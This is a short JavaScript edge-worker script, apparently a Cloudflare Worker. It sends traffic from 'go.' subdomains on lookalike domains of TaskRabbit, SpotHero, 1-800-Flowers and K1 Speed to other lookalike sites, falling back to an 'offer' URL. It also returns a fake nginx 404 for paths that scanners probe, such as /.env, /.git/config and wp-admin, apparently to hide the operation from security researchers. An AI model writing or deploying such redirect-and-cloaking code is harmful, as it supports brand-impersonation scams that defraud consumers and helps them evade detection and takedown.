const HONEYPOT = [
  "/admin", "/administrator", "/wp-admin", "/wp-login.php",
  "/.env", "/.git/config", "/phpmyadmin", "/xmlrpc.php",
  "/login", "/debug", "/server-status", "/backup",
];

const BRIDGE = {
  "go.k1speed.info": "https://k1speed.cc",
  "go.task-rabbit.info": "https://task-rabbit.us",
  "go.task-rabbit.org": "https://task-rabbit.us",
  "go.taskrabbit-reviews.com": "https://task-rabbit.us",
  "go.spotheroguide.com": "https://spot-hero.us",
  "go.1800flowersinfo.com": "https://1800flower-usa.com",
};

const NGINX_404 = `<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>`;

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const host = url.hostname.toLowerCase();
    const path = url.pathname.replace(/\/+$/, "") || "/";

    const bridge = BRIDGE[host] || env.OFFER_URL;
    if (host.startsWith("go.") && bridge) {
      const dest = new URL(bridge);
      dest.search = url.search;
      return Response.redirect(dest.toString(), 302);
    }

    if (HONEYPOT.includes(path) || HONEYPOT.some((item) => path.startsWith(item + "/"))) {
      return new Response(NGINX_404, {
        status: 404,
        headers: { "content-type": "text/html", server: "nginx" },
      });
    }

    return fetch(request);
  },
};
